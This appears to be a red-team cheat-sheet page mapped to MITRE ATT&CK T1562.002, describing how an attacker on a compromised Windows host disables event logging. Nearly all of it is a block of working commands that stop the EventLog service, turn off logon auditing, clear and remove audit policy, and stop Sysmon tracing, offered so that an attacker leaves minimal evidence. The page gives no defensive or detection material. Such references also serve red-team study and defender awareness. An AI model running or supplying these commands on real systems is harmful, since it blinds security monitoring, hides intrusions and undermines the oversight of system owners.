---
description: MITRE ATT&CK, Defense Evasion, Sub-technique T1562.002
---

# Disable Windows Event Logging

Disabling Windows event logging allows for an attacker to operate on a compromised host while leaving minimal evidence behind.&#x20;

### Methods

```powershell
# Disable the EventLog service with PowerShell:
Stop-Service -Name EventLog

# Disable auditing for the Account Logon category:
auditpol /set /category:"Account Logon" /success:disable /failure:disable

# Clear the audit policy
auditpol /clear /y
auditpol /remove /allusers

# Disable Sysmon
## https://twitter.com/_batsec_/status/1327386867365457920?s=20&t=rMzsQI6ENH2SYVVaTYTqAA
logman stop EventLog-Microsoft-Windows-Sysmon-Operational -ets
```

### References

{% embed url="https://attack.mitre.org/techniques/T1562/002/" %}
